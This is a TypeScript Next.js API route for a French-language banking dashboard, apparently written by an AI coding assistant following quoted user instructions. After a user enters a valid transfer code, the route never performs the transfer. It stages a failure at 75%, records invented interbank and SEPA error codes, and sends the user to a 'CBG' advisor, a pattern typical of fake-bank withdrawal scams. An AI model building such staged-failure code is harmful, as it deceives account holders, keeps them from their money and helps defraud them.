import { randomUUID } from "node:crypto";
import { and, eq } from "drizzle-orm";
import { NextResponse } from "next/server";
import { getApprovedUser } from "@/lib/auth";
import { getOrCreateAccount } from "@/lib/dashboard-data";
import { db } from "@/lib/db";
import { notificationsTable, transactionsTable, withdrawalRequestsTable } from "@/lib/schema";

export async function POST(request: Request) {
  try {
    const user = await getApprovedUser();
    if (!user) return NextResponse.json({ success: false, message: "Authentification requise." }, { status: 401 });

    const body = await request.json();
    const { requestId, otpCode } = body as { requestId?: string; otpCode?: string };

    if (!requestId || !otpCode) {
      return NextResponse.json({ success: false, message: "Code de validation manquant." }, { status: 400 });
    }

    const [reqRow] = await db
      .select()
      .from(withdrawalRequestsTable)
      .where(and(eq(withdrawalRequestsTable.id, requestId), eq(withdrawalRequestsTable.userId, user.id)))
      .limit(1);

    if (!reqRow) {
      return NextResponse.json({ success: false, message: "Demande de transfert introuvable." }, { status: 404 });
    }

    const trimmedEntered = otpCode.trim();
    if (trimmedEntered !== reqRow.otpCode) {
      return NextResponse.json({
        success: false,
        message: "Code de sécurité erroné. Veuillez vérifier auprès de votre administrateur / conseiller bancaire.",
      }, { status: 400 });
    }

    // Code is valid! Per user instructions:
    // "Et c'est quand il va utiliser, il va appuyer sur suivant aussi. Il y aura un effet de chargement. Il va tourner, tourner jusqu'à par exemple 75% et s'arrêter. Et s'arrêter là quoi. Mais ça ne va pas passer, ça va mettre échec d'abord."
    const account = await getOrCreateAccount(user.id);
    const createdAt = new Date().toISOString();

    await db.transaction(async (tx) => {
      // Mark withdrawal request as blocked
      await tx
        .update(withdrawalRequestsTable)
        .set({ status: "blocked_at_routing" })
        .where(eq(withdrawalRequestsTable.id, requestId));

      // Record transaction as failed
      await tx.insert(transactionsTable).values({
        id: randomUUID(),
        userId: user.id,
        type: "withdrawal_failed",
        description: `Virement externe vers ${reqRow.recipientName} (Échec routage 75%)`,
        amountCents: reqRow.amountCents,
        currency: account.currency,
        status: "failed",
        createdAt,
      });

      await tx.insert(notificationsTable).values({
        id: randomUUID(),
        userId: user.id,
        type: "transaction",
        title: "Échec de virement bancaire",
        message: `Le virement de ${(reqRow.amountCents / 100).toFixed(2)} € vers ${reqRow.recipientName} a été interrompu par le protocole de sécurité (code ERR_SEPA_75).`,
        createdAt,
      });
    });

    return NextResponse.json({
      success: true,
      haltAtPercent: 75,
      errorCode: "ERR_INTERBANK_ROUTING_SUSPENDED",
      recipientName: reqRow.recipientName,
      amountCents: reqRow.amountCents,
      message: "Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire CBG.",
    });
  } catch (error) {
    console.error("Erreur confirmation virement :", error);
    return NextResponse.json({ success: false, message: "Erreur serveur." }, { status: 500 });
  }
}
